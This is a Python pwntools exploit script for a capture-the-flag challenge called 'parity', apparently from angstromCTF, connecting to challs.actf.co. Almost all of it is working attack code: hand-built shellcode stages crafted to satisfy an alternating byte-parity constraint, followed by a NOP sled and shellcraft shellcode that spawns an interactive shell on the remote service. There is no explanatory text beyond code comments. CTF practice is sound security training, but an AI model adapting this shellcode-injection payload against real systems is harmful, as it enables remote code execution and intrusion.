#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challs.actf.co --port 31226 ./parity
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./parity')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31226)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x00000000004012f5
continue
c
b *0x40128a
c

'''.format(**locals()) + "c\n"*56

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
read_asm = asm(shellcraft.write(0,"rsp",255))
p = read_asm

# rdx rsi
# 0x0000000000401278 - 0x00000000401300
# {dec_esi*0x88}mov rax, rsi
# {dec_esi*(0x88+4)}
# {inc_rsp*(0x40)}
shell_1 = asm("""
    
    """)

dec_esi = "dec esi\n"
inc_rsp = "inc rsp\n"
shell_2 = b"" + asm(f"""
    mov rsi, rbx
    {dec_esi*(0x88+4)}
    """) +  b"" + (b"\xf3"+asm(f"""
    {inc_rsp}

    """))*(8*7)

shell_3 = asm(""" 
    call rsi
    """)


p = shell_1 + shell_2 + shell_3
# print(disasm(p))
print (shell_1, len(shell_1))
print (shell_2, len(shell_1)+1,len(shell_2)+len(shell_1))
print (shell_3, len(shell_2)+len(shell_1)+1,len(shell_3)+len(shell_2)+len(shell_1))
for i in range(len(p)):
    if ( p[i] & 1) != i % 2 :
        print (f"mantap {i+1}")
print(len(p))
io.sendafter(b"> ",p)
sleep(2)

p = b"\x90"*520+shellcode
io.sendline(p)


io.interactive()

